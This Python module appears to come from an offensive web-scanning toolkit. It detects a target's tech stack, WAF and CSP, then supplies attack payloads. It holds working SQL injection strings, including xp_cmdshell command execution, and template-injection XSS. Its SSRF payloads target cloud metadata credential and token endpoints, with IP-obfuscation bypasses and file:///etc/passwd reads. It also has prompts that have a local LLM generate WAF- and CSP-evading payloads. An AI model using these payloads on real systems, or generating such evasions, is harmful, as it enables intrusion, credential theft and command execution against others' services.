import os as _os, sys as _sys
_sys.path.insert(0, _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))))
#!/usr/bin/env python3
# ai/payload_generator.py — AI-Powered Payload Generator
# AI-Cycle 3: Generate custom payloads based on tech stack + target context
# MilkyWay Intelligence | Author: Sharlix + M7AI

import os, re, json
from typing import Optional

# ── Tech stack → payload strategy ────────────────────────────────────────────
TECH_PAYLOAD_MAP = {
    # WAF/CDN detection → use bypass variants
    "cloudflare":   ["waf_bypass","entity_encoding","polyglot"],
    "akamai":       ["waf_bypass","polyglot","mxss"],
    "imperva":      ["waf_bypass","entity_encoding"],
    "f5":           ["waf_bypass","url"],
    "sucuri":       ["waf_bypass","polyglot"],
    # Framework → context-specific
    "react":        ["js","dom_xss","polyglot"],
    "angular":      ["angular_template","js","polyglot"],
    "vue":          ["js","polyglot"],
    "django":       ["ssti_python","html","attr"],
    "flask":        ["ssti_python","html","attr"],
    "rails":        ["ssti_ruby","html","attr"],
    "spring":       ["ssti_java","el_injection"],
    "wordpress":    ["html","attr","waf_bypass"],
    "laravel":      ["ssti_php","html"],
    # DB stack
    "mysql":        ["sqli_mysql","sqli_boolean","sqli_union"],
    "postgresql":   ["sqli_postgres","sqli_boolean"],
    "mongodb":      ["nosql_operator","nosql_js"],
    "mssql":        ["sqli_mssql","sqli_stacked"],
    "oracle":       ["sqli_oracle","sqli_union"],
}

# ── CSP bypass strategies ─────────────────────────────────────────────────────
CSP_BYPASS_STRATEGY = {
    "unsafe-inline": "CSP has unsafe-inline — standard XSS payloads work",
    "unsafe-eval":   "CSP has unsafe-eval — eval() based payloads work",
    "cdn.jsdelivr":  "CDN whitelisted — use JSONP: cdn.jsdelivr.net/npm/...",
    "cdnjs":         "CDN whitelisted — find JSONP endpoint on cdnjs",
    "unpkg.com":     "CDN whitelisted — use JSONP: unpkg.com/...",
    "nonce-":        "Nonce-based CSP — look for nonce reuse or injection",
    "none":          "Strict CSP — try SSTI if template engine detected",
}

# ── Ollama payload generation prompts ────────────────────────────────────────
PAYLOAD_GEN_PROMPTS = {
    "XSS": """Generate 5 XSS payloads for this specific context.
Target tech: {tech_stack}
Detected WAF: {waf}
CSP header: {csp}
Context: {context} (html/attr/js/url)
Response sample: {response_sample}

Generate payloads that:
1. Match the injection context exactly
2. Bypass detected WAF/CSP if present
3. Use appropriate encoding for the context
4. Prioritize low-FP-risk payloads

Respond ONLY with JSON: {{"payloads": ["payload1","payload2",...]}}""",

    "SQLI": """Generate 5 SQL injection payloads for this target.
Database: {tech_stack}
WAF detected: {waf}
Vulnerable parameter: {param}
Error pattern seen: {error_pattern}

Generate payloads for:
1. Error-based extraction
2. Boolean-based blind
3. Time-based blind (if others fail)

Respond ONLY with JSON: {{"payloads": ["payload1","payload2",...]}}""",

    "SSRF": """Generate SSRF payloads for this cloud environment.
Cloud provider: {tech_stack}
Blocked patterns: {blocked}
Vulnerable parameter: {param}

Generate bypasses for common blocks (127.0.0.1, 169.254.x.x).
Include: decimal IP, octal, hex, IPv6 equivalents.

Respond ONLY with JSON: {{"payloads": ["payload1","payload2",...]}}""",
}


class PayloadGenerator:
    """
    AI-Powered Payload Generator.
    AI-Cycle 3:
    - Detects tech stack from response headers/body
    - Generates targeted payloads via Ollama
    - Falls back to DB-driven payloads if no Ollama
    - Adapts to WAF/CSP constraints
    """

    def __init__(self, ollama_ai=None, log=None):
        self.ollama = ollama_ai
        self.log    = log

    def generate_xss_payloads(self, tech_stack: list, waf: str,
                               csp: str, context: str,
                               response_sample: str = "") -> list:
        """Generate targeted XSS payloads for detected environment."""
        # Step 1: Select base categories from tech stack
        categories = self._tech_to_categories(tech_stack)

        # Step 2: Apply CSP strategy
        csp_note = self._analyze_csp(csp)

        # Step 3: Load from payload DB
        from engines.xss_payloads_db import (
            XSS_PAYLOADS_BY_CONTEXT, get_payloads_for_context
        )
        waf_detected = bool(waf and waf.lower() not in ("none",""))
        base_payloads = get_payloads_for_context(
            context, count=8, waf_bypass=waf_detected)

        # Extract just payload strings
        payloads = [p[0] for p in base_payloads]

        # Step 4: Add Angular payloads if Angular detected
        if "angular" in [t.lower() for t in tech_stack]:
            from engines.xss_payloads_db import XSS_PAYLOADS_BY_CONTEXT
            payloads += [
                "{{constructor.constructor('alert(1)')()}}",
                "{{$on.constructor('alert(1)')()}}",
            ]

        # Step 5: If Ollama available, generate custom payloads
        if self.ollama and self.ollama.is_available():
            custom = self._ollama_generate("XSS", {
                "tech_stack":    ", ".join(tech_stack) or "unknown",
                "waf":           waf or "none",
                "csp":           csp[:100] if csp else "none",
                "context":       context,
                "response_sample": response_sample[:200],
            })
            if custom:
                # Add AI-generated payloads at front (highest priority)
                payloads = custom + payloads

        if self.log and csp_note:
            self.log.info(f"  [PayloadGen] CSP note: {csp_note}")

        return list(dict.fromkeys(payloads))[:12]

    def generate_sqli_payloads(self, db_type: str, waf: str,
                                error_pattern: str, param: str) -> list:
        """Generate targeted SQLi payloads for detected DB."""
        from engines.xss_payloads_db import XSS_PAYLOADS_BY_CONTEXT

        # Base SQLi payloads by DB type
        DB_PAYLOADS = {
            "mysql": [
                "' AND SLEEP(5)-- -",
                "' AND SLEEP(5)#",
                "1' UNION SELECT @@version,NULL-- -",
                "' AND 1=(SELECT 1 FROM information_schema.tables)-- -",
                "' OR SLEEP(5)-- -",
            ],
            "postgresql": [
                "'; SELECT pg_sleep(5)-- -",
                "' UNION SELECT version(),NULL-- -",
                "' AND 1=(SELECT 1 FROM pg_tables)-- -",
            ],
            "mssql": [
                "'; WAITFOR DELAY '0:0:5'-- -",
                "' UNION SELECT @@version,NULL-- -",
                "'; EXEC xp_cmdshell('whoami')-- -",
            ],
            "oracle": [
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
                "' UNION SELECT banner,NULL FROM v$version-- -",
            ],
            "generic": [
                "' OR '1'='1",
                "' OR 1=1-- -",
                "1 OR 1=1",
                "' UNION SELECT NULL-- -",
            ],
        }
        payloads = DB_PAYLOADS.get(db_type.lower(),
                                    DB_PAYLOADS["generic"])

        # Ollama custom generation
        if self.ollama and self.ollama.is_available():
            custom = self._ollama_generate("SQLI", {
                "tech_stack":    db_type or "unknown",
                "waf":           waf or "none",
                "param":         param,
                "error_pattern": error_pattern[:100] if error_pattern else "none",
            })
            if custom:
                payloads = custom + payloads

        return payloads[:10]

    def generate_ssrf_payloads(self, cloud_provider: str,
                                blocked_patterns: list, param: str) -> list:
        """Generate SSRF bypass payloads for cloud environment."""
        BASE = {
            "aws": [
                "http://169.254.169.254/latest/meta-data/",
                "http://2852039166/latest/meta-data/",        # decimal
                "http://0xa9fea9fe/latest/meta-data/",        # hex
                "http://0251.0376.0251.0376/latest/meta-data/",# octal
                "http://[::ffff:a9fe:a9fe]/latest/meta-data/",# IPv6
                "http://169.254.169.254%2Flatest%2Fmeta-data/",# encoded
                "http://metadata.aws.internal/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            ],
            "gcp": [
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            ],
            "azure": [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            ],
            "generic": [
                "http://127.0.0.1/",
                "http://localhost/",
                "http://0.0.0.0/",
                "http://[::1]/",
                "http://0177.0.0.1/",  # octal localhost
                "http://2130706433/",   # decimal localhost
                "dict://127.0.0.1:6379/info",
                "file:///etc/passwd",
            ],
        }
        payloads = BASE.get(cloud_provider.lower(), BASE["generic"])

        # Ollama custom generation
        if self.ollama and self.ollama.is_available():
            custom = self._ollama_generate("SSRF", {
                "tech_stack": cloud_provider or "generic",
                "waf":        "unknown",
                "param":      param,
                "blocked":    ", ".join(blocked_patterns[:5]) if blocked_patterns else "none",
            })
            if custom:
                payloads = custom + payloads

        return payloads[:12]

    def detect_tech_stack(self, headers: dict = None, body: str = '') -> dict:
        headers = headers or {}
        """
        Detect technology stack from response headers and body.
        Returns: {waf, frameworks, db, cloud, cms}
        """
        result = {"waf":"", "frameworks":[], "db":"", "cloud":"", "cms":""}
        body_l = body.lower() if body else ""

        # WAF detection from headers + body
        waf_sigs = {
            "cloudflare":  ["cf-ray","cf-cache-status","cloudflare"],
            "akamai":      ["akamai","x-check-cacheable","x-akamai"],
            "imperva":     ["imperva","incapsula","_incap_"],
            "f5":          ["x-wafinfo","x-forwarded-by.*f5"],
            "sucuri":      ["x-sucuri-id","sucuri"],
        }
        headers_str = str(headers).lower()
        for waf_name, sigs in waf_sigs.items():
            if any(s in headers_str or s in body_l for s in sigs):
                result["waf"] = waf_name
                break

        # Framework detection
        fw_sigs = {
            "react":      ["__reactfiber","reactroot","react.development"],
            "angular":    ["ng-version","ng-app","angular.js","_ng_app_id"],
            "vue":        ["__vue__","vue.js","data-v-"],
            "django":     ["csrfmiddlewaretoken","django","x-frame-options.*sameorigin"],
            "flask":      ["werkzeug","flask"],
            "rails":      ["x-runtime","x-powered-by.*phusion"],
            "laravel":    ["laravel_session","x-powered-by.*php"],
            "spring":     ["x-powered-by.*spring","thymeleaf","jsessionid"],
            "wordpress":  ["wp-content","wordpress","wp-login"],
        }
        for fw, sigs in fw_sigs.items():
            if any(re.search(s, headers_str + body_l) for s in sigs):
                result["frameworks"].append(fw)

        # DB detection
        db_sigs = {
            "mysql":      ["mysql","mariadb"],
            "postgresql": ["postgresql","psql"],
            "mongodb":    ["mongodb","mongoose"],
            "mssql":      ["mssql","sql server"],
            "oracle":     ["oracle","ora-"],
        }
        for db, sigs in db_sigs.items():
            if any(s in headers_str + body_l for s in sigs):
                result["db"] = db
                break

        # Cloud detection
        cloud_sigs = {
            "aws":   ["amazonaws","x-amz","aws-"],
            "gcp":   ["google cloud","gcp","googleapis"],
            "azure": ["azure","windows azure","x-ms-"],
        }
        for cloud, sigs in cloud_sigs.items():
            if any(s in headers_str for s in sigs):
                result["cloud"] = cloud
                break

        return result

    # ── Ollama payload generation ─────────────────────────────────────────────
    def _ollama_generate(self, vuln_type: str, context: dict) -> list:
        if not self.ollama or not self.ollama.is_available():
            return []
        prompt_template = PAYLOAD_GEN_PROMPTS.get(vuln_type,"")
        if not prompt_template:
            return []
        try:
            prompt = prompt_template.format(**context)
            raw    = self.ollama._query_ollama(prompt)
            # Extract JSON
            m = re.search(r'\{"payloads"\s*:\s*\[([^\]]+)\]', raw, re.DOTALL)
            if m:
                items = re.findall(r'"([^"]+)"', m.group(1))
                return [i for i in items if len(i) > 3][:5]
        except Exception:
            pass
        return []

    def _tech_to_categories(self, tech_stack: list) -> list:
        cats = []
        for tech in tech_stack:
            cats.extend(TECH_PAYLOAD_MAP.get(tech.lower(),[]))
        return list(dict.fromkeys(cats)) or ["html","waf_bypass"]

    def _analyze_csp(self, csp: str) -> str:
        if not csp: return ""
        for directive, note in CSP_BYPASS_STRATEGY.items():
            if directive in csp.lower():
                return note
        return ""


if __name__ == "__main__":
    gen = PayloadGenerator()

    print("=== XSS Payload Generation ===")
    payloads = gen.generate_xss_payloads(
        tech_stack=["react","cloudflare"],
        waf="cloudflare",
        csp="script-src 'self' cdn.jsdelivr.net",
        context="html")
    for p in payloads[:5]:
        print(f"  {p[:70]}")

    print("\n=== Tech Stack Detection ===")
    headers = {"x-powered-by":"Next.js","cf-ray":"abc123","server":"cloudflare"}
    body    = "<div ng-app><script src='react.development.js'>"
    tech    = gen.detect_tech_stack(headers, body)
    print(f"  WAF: {tech['waf']}")
    print(f"  Frameworks: {tech['frameworks']}")

    print("\n=== SSRF Bypass Payloads (AWS) ===")
    ssrf = gen.generate_ssrf_payloads("aws", ["169.254.169.254","127.0.0.1"], "url")
    for p in ssrf[:4]:
        print(f"  {p}")
